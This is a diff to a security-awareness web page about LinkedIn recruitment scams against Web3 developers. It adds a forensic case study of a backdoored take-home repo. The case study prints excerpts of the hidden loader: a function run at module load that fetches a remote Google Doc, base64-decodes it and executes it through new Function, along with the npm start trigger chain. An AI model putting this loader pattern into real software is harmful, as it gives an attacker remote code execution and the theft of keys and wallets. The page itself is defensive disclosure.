@@ -4,7 +4,7 @@
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <meta name="description" content="Security awareness portal documenting sophisticated LinkedIn recruitment scams targeting Web3 and fullstack developers." />
-  <title>🛡️ Dev Recruitment Safeguards — LinkedIn Scam Alerts</title>
+  <title>Dev Recruitment Safeguards — LinkedIn Scam Alerts</title>
 
   <!-- Favicon -->
   <link rel="icon" type="image/svg+xml" href="favicon.svg" />
@@ -14,7 +14,7 @@
   <!-- Open Graph / Social preview -->
   <meta property="og:type" content="website" />
   <meta property="og:url" content="https://drasticstatic.github.io/dev-recruitment-safeguards/" />
-  <meta property="og:title" content="🛡️ Dev Recruitment Safeguards — LinkedIn Scam Alerts" />
+  <meta property="og:title" content="Dev Recruitment Safeguards — LinkedIn Scam Alerts" />
   <meta property="og:description" content="Security awareness portal documenting sophisticated LinkedIn recruitment scams targeting Web3 and fullstack developers." />
   <meta property="og:image" content="https://drasticstatic.github.io/dev-recruitment-safeguards/og-image.png" />
   <meta property="og:image:width" content="1200" />
@@ -23,7 +23,7 @@
 
   <!-- Twitter / X card -->
   <meta name="twitter:card" content="summary_large_image" />
-  <meta name="twitter:title" content="🛡️ Dev Recruitment Safeguards — LinkedIn Scam Alerts" />
+  <meta name="twitter:title" content="Dev Recruitment Safeguards — LinkedIn Scam Alerts" />
   <meta name="twitter:description" content="Security awareness portal documenting sophisticated LinkedIn recruitment scams targeting Web3 and fullstack developers." />
   <meta name="twitter:image" content="https://drasticstatic.github.io/dev-recruitment-safeguards/og-image.png" />
   <script src="https://cdn.tailwindcss.com"></script>
@@ -90,6 +90,18 @@
 
     /* ── Modal scroll lock ── */
     .modal-open { overflow: hidden; }
+
+    /* ── Anchor offset: keeps section titles clear of the sticky nav ── */
+    section[id] { scroll-margin-top: 88px; }
+
+    /* ── Hero parallax: attachment only, so .grid-bg's own
+       background-size (40px 40px tiling) is preserved ── */
+    .parallax-bg { background-attachment: fixed; }
+    @media (max-width: 768px), (prefers-reduced-motion: reduce) {
+      /* iOS Safari doesn't support background-attachment: fixed reliably,
+         and reduced-motion users shouldn't get the parallax feel either */
+      .parallax-bg { background-attachment: scroll; }
+    }
   </style>
 </head>
 <body class="text-slate-200 min-h-screen">
@@ -100,7 +112,7 @@
 <nav class="sticky top-0 z-50 bg-slate-900/95 backdrop-blur border-b border-slate-800">
   <div class="max-w-6xl mx-auto px-4 py-3 flex items-center justify-between">
     <div class="flex items-center gap-2">
-      <span class="text-xl">🛡️</span>
+      <img src="favicon.svg" alt="" class="w-6 h-6" />
       <span class="font-bold text-white text-sm md:text-base">Dev Recruitment Safeguards</span>
     </div>
     <div class="hidden md:flex items-center gap-6 text-sm text-slate-400">
@@ -120,7 +132,7 @@
 <!-- ═══════════════════════════════════════════
      HERO
 ═══════════════════════════════════════════ -->
-<section class="relative overflow-hidden grid-bg" style="background-color:#0a0f1e;">
+<section class="relative overflow-hidden grid-bg parallax-bg" style="background-color:#0a0f1e;">
   <div class="absolute inset-0 pointer-events-none" style="background:radial-gradient(ellipse at 50% 0%, rgba(239,68,68,0.12) 0%, transparent 65%);"></div>
   <div class="relative max-w-6xl mx-auto px-4 py-20 md:py-32 text-center">
 
@@ -136,12 +148,12 @@
     <p class="text-slate-400 text-lg md:text-xl max-w-2xl mx-auto mb-10">
       Real-world documentation of sophisticated "long-con" recruitment scams targeting
       <strong class="text-slate-200">Web3 &amp; fullstack developers</strong> on LinkedIn.
-      Seven documented cases — six confirmed, one under active investigation.
+      Eight documented cases — six confirmed, one under active investigation, one illustrative.
     </p>
 
     <div class="flex flex-wrap justify-center gap-4 mb-10">
       <div class="bg-slate-800/60 border border-slate-700 rounded-xl px-5 py-3 text-center">
-        <div class="text-2xl font-black text-red-400">7</div>
+        <div class="text-2xl font-black text-red-400">8</div>
         <div class="text-xs text-slate-400 mt-0.5">Documented Cases</div>
       </div>
       <div class="bg-slate-800/60 border border-slate-700 rounded-xl px-5 py-3 text-center">
@@ -159,8 +171,11 @@
     </div>
 
     <div class="flex flex-wrap justify-center gap-3">
-      <a href="#checklist"    class="bg-emerald-600 hover:bg-emerald-500 text-white font-semibold px-6 py-3 rounded-xl transition-colors">🛡️ View Checklist</a>
-      <a href="#case-studies" class="bg-slate-700   hover:bg-slate-600   text-white font-semibold px-6 py-3 rounded-xl transition-colors">🔍 Case Studies</a>
+      <a href="#checklist"    class="bg-emerald-600 hover:bg-emerald-500 text-white font-semibold px-6 py-3 rounded-xl transition-colors">⚠️ View Checklist</a>
+      <a href="#case-studies" class="bg-slate-700   hover:bg-slate-600   text-white font-semibold px-6 py-3 rounded-xl transition-colors">📂 Case Studies</a>
+      <a href="#virustotal"   class="bg-slate-700   hover:bg-slate-600   text-white font-semibold px-6 py-3 rounded-xl transition-colors">🧪 VirusTotal</a>
+      <a href="#defense"      class="bg-slate-700   hover:bg-slate-600   text-white font-semibold px-6 py-3 rounded-xl transition-colors">🛡️ Defense</a>
+      <a href="#wild"         class="bg-slate-700   hover:bg-slate-600   text-white font-semibold px-6 py-3 rounded-xl transition-colors">🌐 In the Wild</a>
     </div>
   </div>
 </section>
@@ -319,7 +334,7 @@
 <section id="case-studies" class="max-w-6xl mx-auto px-4 pb-16">
   <div class="text-center mb-12">
     <h2 class="text-3xl md:text-4xl font-black text-white mb-3">📂 Documented Case Studies</h2>
-    <p class="text-slate-400 text-sm">Seven real attack campaigns — documented from first contact to full analysis. Click <strong class="text-cyan-400">Deep Dive</strong> for technical details.</p>
+    <p class="text-slate-400 text-sm">Eight attack campaigns — seven real, one illustrative — documented from first contact to full analysis. Click <strong class="text-cyan-400">Deep Dive</strong> for technical details.</p>
   </div>
 
   <div class="grid lg:grid-cols-2 xl:grid-cols-4 gap-6">
@@ -484,18 +499,69 @@
       </div>
     </div>
 
-    <!-- ── Case 4: The Typosquat ── -->
-    <div class="case-card bg-slate-900 border border-red-900/50 rounded-2xl overflow-hidden flex flex-col">
+    <!-- ── Case 4: The Weaponized Repo ── -->
+    <div class="case-card bg-slate-900 border-2 border-red-700 rounded-2xl overflow-hidden flex flex-col ring-2 ring-red-900/40">
       <div class="bg-gradient-to-r from-red-950 to-slate-900 p-5 border-b border-red-900/30">
         <div class="flex items-center justify-between mb-3">
-          <span class="bg-red-600 text-white text-xs font-bold px-2.5 py-1 rounded-full pulse-red">🔴 CRITICAL</span>
+          <span class="bg-red-600 text-white text-xs font-bold px-2.5 py-1 rounded-full pulse-red">🔴 CRITICAL — CONFIRMED RCE</span>
           <span class="text-slate-500 text-xs">Case #4</span>
         </div>
-        <h3 class="text-xl font-black text-white mb-1">🪤 The Typosquat</h3>
-        <p class="text-slate-400 text-sm">Supply-chain wallet drainer via misspelled <code class="text-cyan-400 text-xs bg-slate-800 px-1 rounded">npm install</code></p>
+        <h3 class="text-xl font-black text-white mb-1">💣 The Weaponized Repo</h3>
+        <p class="text-slate-400 text-sm">Remote-code-execution backdoor hidden in a stolen sniper-bot, disguised as a hiring take-home</p>
       </div>
       <div class="p-5 flex flex-col flex-1">
         <div class="space-y-2.5 mb-5 flex-1 text-sm">
+          <div class="flex gap-2">
+            <span class="text-slate-500 w-16 flex-shrink-0">Persona</span>
+            <span class="text-red-300 font-medium">"Daniel Perez Valdes" — mutual connection with a trusted DappU instructor</span>
+          </div>
+          <div class="flex gap-2 items-center">
+            <span class="text-slate-500 w-16 flex-shrink-0">Repo</span>
+            <code class="text-cyan-400 text-xs bg-slate-800 px-1.5 py-0.5 rounded">nitroe1/TokenPromotingDapp</code>
+          </div>
+          <div class="flex gap-2">
+            <span class="text-slate-500 w-16 flex-shrink-0">Backdoor</span>
+            <span class="text-slate-300 text-xs">
+              <span class="tt text-red-400" data-tip="verifyToken() fires unconditionally at module load. It fetches a private Google Doc, base64-decodes the contents, then runs new Function('axios','require', code)(axios, require) — arbitrary attacker-controlled code with exfil and require access.">frontController.js: verifyToken()</span>
+              — fetches + evals remote code on <code class="text-red-400 text-xs">npm start</code>
+            </span>
+          </div>
+          <div class="flex gap-2">
+            <span class="text-slate-500 w-16 flex-shrink-0">Also</span>
+            <span class="text-slate-300 text-xs">A real front-running/sniper bot underneath, requiring a live wallet private key from environment</span>
+          </div>
+          <div class="flex gap-2 items-center">
+            <span class="text-slate-500 w-16 flex-shrink-0">VT score</span>
+            <span class="text-emerald-400 font-mono font-bold">0 community flags</span>
+            <span class="tt text-amber-300 text-xs ml-1" data-tip="Same lesson as every other case here: a clean VirusTotal score reflects known-signature scanning of the repo listing, not a live security audit of every source file and its remote payload fetch.">← again, not a clearance ⚠️</span>
+          </div>
+          <div class="mt-2 p-3 bg-red-950/30 border border-red-800/30 rounded-xl">
+            <div class="text-xs text-red-300 font-semibold mb-1">🎯 Why this is the flagship case</div>
+            <div class="text-xs text-slate-400">Fully sourced: GitHub API timestamps, signature-verification data, and direct source review — not inference. Confirmed <strong class="text-white">DO NOT FORK, DO NOT RUN.</strong></div>
+          </div>
+        </div>
+        <button onclick="openModal('modal-weaponized-repo')"
+          class="w-full bg-red-700 hover:bg-red-600 border border-red-600 text-white text-sm font-bold py-2.5 rounded-xl transition-colors">
+          🔬 Full Forensic Deep Dive
+        </button>
+      </div>
+    </div>
+
+    <!-- ── Case 5: The Typosquat (hypothetical teaching example) ── -->
+    <div class="case-card bg-slate-900 border border-red-900/50 rounded-2xl overflow-hidden flex flex-col">
+      <div class="bg-gradient-to-r from-red-950 to-slate-900 p-5 border-b border-red-900/30">
+        <div class="flex items-center justify-between mb-3">
+          <span class="bg-slate-700 text-white text-xs font-bold px-2.5 py-1 rounded-full">🧪 HYPOTHETICAL</span>
+          <span class="text-slate-500 text-xs">Case #5</span>
+        </div>
+        <h3 class="text-xl font-black text-white mb-1">🪤 The Typosquat</h3>
+        <p class="text-slate-400 text-sm">Illustrative example — supply-chain wallet drainer via misspelled <code class="text-cyan-400 text-xs bg-slate-800 px-1 rounded">npm install</code></p>
+      </div>
+      <div class="p-5 flex flex-col flex-1">
+        <div class="space-y-2.5 mb-5 flex-1 text-sm">
+          <div class="mt-0 mb-1 p-2.5 bg-slate-800/60 border border-slate-600/50 rounded-lg text-xs text-slate-400">
+            <strong class="text-slate-300">Not a documented incident.</strong> This is a teaching scenario illustrating a real class of supply-chain risk, distinct from the reported cases on this page.
+          </div>
           <div class="flex gap-2">
             <span class="text-slate-500 w-16 flex-shrink-0">Persona</span>
             <span class="text-red-300 font-medium italic">Educational exemplar</span>
@@ -535,12 +601,12 @@
       </div>
     </div>
 
-    <!-- ── Case 5: The Wrapped Link ── -->
+    <!-- ── Case 6: The Wrapped Link ── -->
     <div class="case-card bg-slate-900 border border-amber-900/50 rounded-2xl overflow-hidden flex flex-col">
       <div class="bg-gradient-to-r from-amber-950 to-slate-900 p-5 border-b border-amber-900/30">
         <div class="flex items-center justify-between mb-3">
           <span class="bg-amber-600 text-white text-xs font-bold px-2.5 py-1 rounded-full">🟠 HIGH</span>
-          <span class="text-slate-500 text-xs">Case #5</span>
+          <span class="text-slate-500 text-xs">Case #6</span>
         </div>
         <h3 class="text-xl font-black text-white mb-1">🔗 The Wrapped Link</h3>
         <p class="text-slate-400 text-sm">LinkedIn redirect wrapper hides the real destination of a Google Doc lure</p>
@@ -579,12 +645,12 @@
       </div>
     </div>
 
-    <!-- ── Case 6: The Real Project, Fake Recruiter ── -->
+    <!-- ── Case 7: The Real Project, Fake Recruiter ── -->
     <div class="case-card bg-slate-900 border border-purple-900/50 rounded-2xl overflow-hidden flex flex-col">
       <div class="bg-gradient-to-r from-purple-950 to-slate-900 p-5 border-b border-purple-900/30">
         <div class="flex items-center justify-between mb-3">
           <span class="bg-slate-600 text-white text-xs font-bold px-2.5 py-1 rounded-full">🔵 INVESTIGATING</span>
-          <span class="text-slate-500 text-xs">Case #6</span>
+          <span class="text-slate-500 text-xs">Case #7</span>
         </div>
         <h3 class="text-xl font-black text-white mb-1">🎭 The Real Project, Fake Recruiter</h3>
         <p class="text-slate-400 text-sm">Impersonation of a confirmed, funded, real Web3/AI project</p>
@@ -625,12 +691,12 @@
       </div>
     </div>
 
-    <!-- ── Case 7: The Pre-Hired Take-Home ── -->
+    <!-- ── Case 8: The Pre-Hired Take-Home ── -->
     <div class="case-card bg-slate-900 border border-red-900/50 rounded-2xl overflow-hidden flex flex-col">
       <div class="bg-gradient-to-r from-red-950 to-slate-900 p-5 border-b border-red-900/30">
         <div class="flex items-center justify-between mb-3">
           <span class="bg-red-600 text-white text-xs font-bold px-2.5 py-1 rounded-full pulse-red">🔴 CRITICAL</span>
-          <span class="text-slate-500 text-xs">Case #7</span>
+          <span class="text-slate-500 text-xs">Case #8</span>
         </div>
         <h3 class="text-xl font-black text-white mb-1">⏱️ The Pre-Hired Take-Home</h3>
         <p class="text-slate-400 text-sm">Real-time transcript: pre-hired framing → 24-hour take-home pressure</p>
@@ -1147,6 +1213,160 @@
 </div>
 
 <!-- Modal: The Typosquat -->
+<!-- Modal: The Weaponized Repo -->
+<div id="modal-weaponized-repo" class="hidden fixed inset-0 z-50 flex items-center justify-center p-4">
+  <div class="absolute inset-0 bg-black/75 backdrop-blur-sm" onclick="closeModal('modal-weaponized-repo')"></div>
+  <div class="relative bg-slate-900 border-2 border-red-700 rounded-2xl w-full max-w-3xl max-h-[90vh] overflow-y-auto shadow-2xl">
+    <div class="sticky top-0 bg-slate-900/95 backdrop-blur border-b border-slate-800 p-5 flex items-center justify-between z-10">
+      <h3 class="text-lg font-black text-white">💣 Deep Dive: The Weaponized Repo</h3>
+      <button onclick="closeModal('modal-weaponized-repo')" class="text-slate-400 hover:text-white text-2xl leading-none w-8 h-8 flex items-center justify-center rounded-lg hover:bg-slate-800 transition-colors">&times;</button>
+    </div>
+    <div class="p-6 space-y-5">
+
+      <div class="bg-red-700 text-white rounded-xl p-4 text-center">
+        <div class="font-black text-lg">⛔ VERDICT: DO NOT FORK. DO NOT RUN.</div>
+        <div class="text-sm text-red-100 mt-1">Confirmed remote-code-execution backdoor. Every finding below is sourced — no inference.</div>
+      </div>
+
+      <div>
+        <h4 class="font-bold text-white text-sm mb-3">⚙️ How the Contact Happened</h4>
+        <p class="text-slate-400 text-sm leading-relaxed">"Daniel Perez Valdes" reached out via LinkedIn as a recruiter for a Web3 role. He shared a mutual connection with the target's own Web3 development instructor — a real relationship that lent the outreach credibility. He sent a link to <code class="text-cyan-400 text-xs bg-slate-800 px-1 rounded">github.com/nitroe1/TokenPromotingDapp</code>, described as an MVP to review before an interview. The repo's front page showed a clean VirusTotal community score. That was the entire trust chain — a real mutual connection, a plausible ask, a clean scan. None of it held up under audit.</p>
+      </div>
+
+      <div>
+        <h4 class="font-bold text-white text-sm mb-3">🚨 The Confirmed Payload — <code class="text-red-400 text-sm">frontController.js</code></h4>
+        <p class="text-slate-400 text-sm mb-3">Buried inside an otherwise-normal-looking Uniswap mempool scanner, a function called <code class="text-cyan-400 text-xs bg-slate-800 px-1 rounded">verifyToken()</code> fires unconditionally the moment the module loads:</p>
+        <div class="code-block p-4 text-xs overflow-x-auto leading-relaxed">
+          <pre class="text-slate-300"><span class="text-slate-500">// frontController.js — runs at module load, i.e. on npm start</span>
+<span class="text-amber-300">async function</span> <span class="text-cyan-300">verifyToken</span>(req, res) {
+  <span class="text-purple-300">try</span> {
+    <span class="text-amber-300">const</span> text = <span class="text-amber-300">await</span> fetchText();      <span class="text-slate-500">// fetches a Google Doc</span>
+    <span class="text-amber-300">const</span> decd = dcpayload(text);        <span class="text-slate-500">// base64-decode it</span>
+    <span class="text-amber-300">const</span> code = extractRunnableJsFromDecoded(decd);
+    <span class="text-red-400">new Function(</span><span class="text-green-300">'axios'</span>, <span class="text-green-300">'require'</span><span class="text-red-400">, code)(axios, require);</span>  <span class="text-red-400">// ⚠️ RCE</span>
+  } <span class="text-purple-300">catch</span> (err) { <span class="text-slate-500">/* ... */</span> }
+}
+verifyToken();  <span class="text-red-400">// ← called immediately at module load</span></pre>
+        </div>
+        <p class="text-slate-400 text-sm mt-3">Decode chain: <code class="text-cyan-400 text-xs bg-slate-800 px-1 rounded">fetchText()</code> pulls a <strong class="text-white">separate, private Google Doc</strong> the attacker controls → <code class="text-cyan-400 text-xs bg-slate-800 px-1 rounded">dcpayload()</code> strips whitespace and base64-decodes it → normalized and unwrapped → <code class="text-red-400 text-xs bg-slate-800 px-1 rounded">new Function('axios','require', code)(axios, require)</code> — a direct <code class="text-red-400 text-xs">eval</code> of attacker-controlled code, with <code class="text-cyan-400 text-xs">axios</code> (network/exfil) and <code class="text-cyan-400 text-xs">require</code> (load any module) handed to it in scope.</p>
+        <p class="text-slate-400 text-sm mt-2">Because the payload lives in a Google Doc the attacker controls independently of the repo, <strong class="text-white">they can change what your machine runs at any time — without touching the code again.</strong> The reach: your <code class="text-cyan-400 text-xs bg-slate-800 px-1 rounded">.env</code> (API keys, any wallet private key you add per the README), browser/wallet data, and a pivot point to scan <code class="text-cyan-400 text-xs">~/.ssh</code> and <code class="text-cyan-400 text-xs">~/.aws</code>.</p>
+      </div>
+
+      <div>
+        <h4 class="font-bold text-white text-sm mb-3">🎯 It's Also a Real Sniper Bot</h4>
+        <p class="text-slate-400 text-sm leading-relaxed">Underneath the backdoor sits a working front-runner: <code class="text-cyan-400 text-xs bg-slate-800 px-1 rounded">scanMempool</code>, <code class="text-cyan-400 text-xs bg-slate-800 px-1 rounded">buyOnV3</code>, <code class="text-cyan-400 text-xs bg-slate-800 px-1 rounded">sell</code> — which requires handing it <code class="text-red-400 text-xs bg-slate-800 px-1 rounded">new ethers.Wallet(amountInfo)</code>, where <code class="text-cyan-400 text-xs">amountInfo</code> is a <strong class="text-white">private key read straight from environment</strong>. So running this repo means: (a) your wallet key hot-loaded into a live trading bot, and (b) arbitrary remote code execution the instant the module loads. Package router constants (<code class="text-cyan-400 text-xs">PAN_ROUTER</code>) and comments referencing "BNB/WBNB" reveal the bot was originally built for PancakeSwap/BSC and rebranded to read "Uniswap" — <strong class="text-white">this is stolen code, not an original MVP.</strong> Leftover debugging comments referencing <code class="text-cyan-400 text-xs">goerli.etherscan.io</code> tx hashes confirm it: another developer's template, repackaged.</p>
+      </div>
+
+      <div>
+        <h4 class="font-bold text-white text-sm mb-3">📋 Confirmed Evidence Chain</h4>
+        <div class="overflow-x-auto rounded-xl border border-slate-700 overflow-hidden">
+          <table class="w-full text-xs text-left">
+            <thead class="bg-slate-800">
+              <tr>
+                <th class="py-2.5 px-3 text-slate-400">#</th>
+                <th class="py-2.5 px-3 text-slate-400">Finding</th>
+                <th class="py-2.5 px-3 text-slate-400">Source</th>
+              </tr>
+            </thead>
+            <tbody class="divide-y divide-slate-800 text-slate-300">
+              <tr>
+                <td class="py-2.5 px-3 text-slate-500">1</td>
+                <td class="py-2.5 px-3">Org + repo both created <strong class="text-white">Aug 12, 2026</strong> — org 29 seconds before the repo — yet the page shows "194 commits," last dated 3 months earlier (May 13, 2026)</td>
+                <td class="py-2.5 px-3 text-cyan-400">GitHub API <code class="text-xs">created_at</code> timestamps</td>
+              </tr>
+              <tr>
+                <td class="py-2.5 px-3 text-slate-500">2</td>
+                <td class="py-2.5 px-3">Sole listed contributor is a real Uniswap developer's account — but the commit dates predate the repo's own creation. Spoofed authorship.</td>
+                <td class="py-2.5 px-3 text-cyan-400">Contributor + commit-date cross-check</td>
+              </tr>
+              <tr>
+                <td class="py-2.5 px-3 text-slate-500">3</td>
+                <td class="py-2.5 px-3"><strong class="text-red-400">RCE backdoor</strong> — <code class="text-xs">verifyToken()</code> at module load, full chain confirmed above</td>
+                <td class="py-2.5 px-3 text-cyan-400">Direct source review, <code class="text-xs">frontController.js</code></td>
+              </tr>
+              <tr>
+                <td class="py-2.5 px-3 text-slate-500">4</td>
+                <td class="py-2.5 px-3">Sniper/front-runner bot requiring a wallet private key; PancakeSwap→Uniswap rebrand; leftover debugging links from another developer</td>
+                <td class="py-2.5 px-3 text-cyan-400">Source + file tree review</td>
+              </tr>
+              <tr>
+                <td class="py-2.5 px-3 text-slate-500">5</td>
+                <td class="py-2.5 px-3">Every one of the 194 commits: <code class="text-xs">verified:false</code>, <code class="text-xs">signature_present:false</code></td>
+                <td class="py-2.5 px-3 text-cyan-400">Commit-verification API</td>
+              </tr>
+              <tr>
+                <td class="py-2.5 px-3 text-slate-500">6</td>
+                <td class="py-2.5 px-3">README describes a clean "token voting/tiers dapp"; the job posting itself calls it a "trading and promoting platform" — matching the hidden bot, not the front-facing README</td>
+                <td class="py-2.5 px-3 text-cyan-400">README vs. job description comparison</td>
+              </tr>
+              <tr>
+                <td class="py-2.5 px-3 text-slate-500">7</td>
+                <td class="py-2.5 px-3">License mismatch across four sources (see below) — traces to stolen code from a separate, unrelated real company</td>
+                <td class="py-2.5 px-3 text-cyan-400">LICENSE file + package.json + GitHub API + UI</td>
+              </tr>
+            </tbody>
+          </table>
+        </div>
+      </div>
+
+      <div>
+        <h4 class="font-bold text-white text-sm mb-3">🕵️ Three Spoofed Identities, Not One</h4>
+        <p class="text-slate-400 text-sm leading-relaxed">Commit authorship spans three different names — one using a forged <code class="text-cyan-400 text-xs bg-slate-800 px-1 rounded">@uniswap.org</code>-style email tied to a real Uniswap developer's public identity, plus two others. A fourth name appears only in <code class="text-cyan-400 text-xs bg-slate-800 px-1 rounded">package.json</code>'s <code class="text-cyan-400 text-xs">author</code> field — matching none of the commit authors, and unrelated to "Daniel" or the org name. The commit messages themselves are bot-templated nonsense — <em>"Polish code in Tiers.js," "Update docs in Poppins-Regular.ttf," "Add UI in dextools_icon.svg"</em> — you don't "polish code in" a font file. The entire 3-month commit history was fabricated with repo-aging tooling and pushed in minutes, all timestamped before the repository itself existed.</p>
+      </div>
+
+      <div>
+        <h4 class="font-bold text-white text-sm mb-3">📜 The License Trail — Stolen Code, Real Victims</h4>
+        <div class="overflow-x-auto rounded-xl border border-slate-700 overflow-hidden mb-3">
+          <table class="w-full text-xs text-left">
+            <thead class="bg-slate-800">
+              <tr><th class="py-2.5 px-3 text-slate-400">Source</th><th class="py-2.5 px-3 text-slate-400">Claims</th></tr>
+            </thead>
+            <tbody class="divide-y divide-slate-800 text-slate-300">
+              <tr><td class="py-2.5 px-3 text-slate-500">README</td><td class="py-2.5 px-3">MIT</td></tr>
+              <tr><td class="py-2.5 px-3 text-slate-500">package.json</td><td class="py-2.5 px-3"><code class="text-xs">"license": "MIT"</code></td></tr>
+              <tr><td class="py-2.5 px-3 text-slate-500">GitHub API</td><td class="py-2.5 px-3">NOASSERTION</td></tr>
+              <tr><td class="py-2.5 px-3 text-slate-500">Actual LICENSE file</td><td class="py-2.5 px-3 text-red-400">Bespoke, non-transferable license granting rights <strong>exclusively to a Dubai-based real-estate tokenization company</strong> from a separate named licensor</td></tr>
+            </tbody>
+          </table>
+        </div>
+        <p class="text-slate-400 text-sm leading-relaxed">Four-way inconsistency, and the fourth one is the true provenance trail: the underlying code was lifted from a real, unrelated company's repository. That company and its named licensor are <strong class="text-white">victims too</strong> — the attacker stitched together stolen code from multiple sources plus a backdoored sniper-bot template, then pasted a recruiter front on top.</p>
+      </div>
+
+      <div>
+        <h4 class="font-bold text-white text-sm mb-3">🔗 The Confirmed Trigger Chain</h4>
+        <div class="code-block p-4 text-xs overflow-x-auto leading-relaxed">
+          <pre class="text-slate-300"><span class="text-slate-500">// package.json</span>
+<span class="text-amber-300">"start"</span>: <span class="text-green-300">"npm run check-env && npm run app:pre | react-scripts ... start"</span>
+<span class="text-amber-300">"app:pre"</span>: <span class="text-green-300">"node app/index.js"</span>
+
+<span class="text-slate-500">// app/index.js</span>
+<span class="text-amber-300">const</span> fController = require(<span class="text-green-300">'./controllers/frontController'</span>);  <span class="text-slate-500">// verifyToken() fires on require</span>
+...
+setTimeout(() => { exitApp(); }, <span class="text-cyan-300">300000</span>);  <span class="text-slate-500">// process.exit(0) after 5 minutes</span></pre>
+        </div>
+        <p class="text-slate-400 text-sm mt-3"><code class="text-cyan-400 text-xs bg-slate-800 px-1 rounded">npm start</code> → <code class="text-cyan-400 text-xs">node app/index.js</code> → <code class="text-cyan-400 text-xs">require('./controllers/frontController')</code> executes the module top-to-bottom, hitting the unconditional <code class="text-red-400 text-xs">verifyToken()</code> call. <strong class="text-white">RCE on startup, confirmed end to end.</strong> The 5-minute <code class="text-cyan-400 text-xs">setTimeout</code> → <code class="text-red-400 text-xs">process.exit(0)</code> is a hit-and-run signature: boot, fire the payload, exfiltrate, self-terminate before anyone notices the backend died.</p>
+      </div>
+
+      <div class="bg-slate-800/50 border border-slate-700/50 rounded-xl p-4">
+        <h4 class="font-bold text-white text-sm mb-2">🧭 A Deliberate Investigative Boundary</h4>
+        <p class="text-sm text-slate-300">The attacker's live payload document was <strong class="text-white">not</strong> retrieved during this investigation. It wasn't needed — the exploitable code path is self-evident from the source alone — and fetching it would have landed in the attacker's access logs, tipping them off. Good forensic practice: gather enough to be certain, stop before you alert the target.</p>
+      </div>
+
+      <div class="bg-emerald-950/30 border border-emerald-800/40 rounded-xl p-4">
+        <h4 class="font-bold text-emerald-300 text-sm mb-2">✅ Safe Response Protocol</h4>
+        <ul class="space-y-1 text-sm text-slate-300 list-disc list-inside">
+          <li>Never run <code class="text-cyan-400 text-xs">npm install</code> or <code class="text-cyan-400 text-xs">npm start</code> against an unaudited take-home repo with any real credentials present, ever</li>
+          <li><code class="text-cyan-400 text-xs">gh api</code> repo/org/commit endpoints reveal timestamp and signature truths that a rendered GitHub page hides</li>
+          <li>A mutual connection with someone you trust is a social-proof signal — verify the actual account independently regardless</li>
+          <li>A clean VirusTotal score on a repo listing is not a source-code audit — read the code, especially anything that fetches and evals remote content</li>
+          <li>Report to GitHub (repo abuse), LinkedIn (recruiter profile), and — where a real developer's identity was spoofed — that developer and their employer directly</li>
+        </ul>
+      </div>
+
+    </div>
+  </div>
+</div>
+
 <div id="modal-typosquat" class="hidden fixed inset-0 z-50 flex items-center justify-center p-4">
   <div class="absolute inset-0 bg-black/75 backdrop-blur-sm" onclick="closeModal('modal-typosquat')"></div>
   <div class="relative bg-slate-900 border border-red-900/50 rounded-2xl w-full max-w-2xl max-h-[90vh] overflow-y-auto shadow-2xl">
@@ -1419,7 +1639,7 @@
               <tr>
                 <th class="py-2.5 px-3 text-slate-400">Signal</th>
                 <th class="py-2.5 px-3 text-red-400">Case #1 (Repo Trap)</th>
-                <th class="py-2.5 px-3 text-red-400">Case #7 (This one)</th>
+                <th class="py-2.5 px-3 text-red-400">Case #8 (This one)</th>
               </tr>
             </thead>
             <tbody class="divide-y divide-slate-800 text-slate-300">
@@ -1574,7 +1794,7 @@
      JAVASCRIPT
 ═══════════════════════════════════════════ -->
 <script>
-  const MODAL_IDS = ['modal-repo-trap','modal-lure','modal-impersonation','modal-virustotal','modal-typosquat','modal-wrapped-link','modal-real-fake-recruiter','modal-pre-hired'];
+  const MODAL_IDS = ['modal-repo-trap','modal-lure','modal-impersonation','modal-virustotal','modal-weaponized-repo','modal-typosquat','modal-wrapped-link','modal-real-fake-recruiter','modal-pre-hired'];
 
   function openModal(id) {
     document.getElementById(id).classList.remove('hidden');
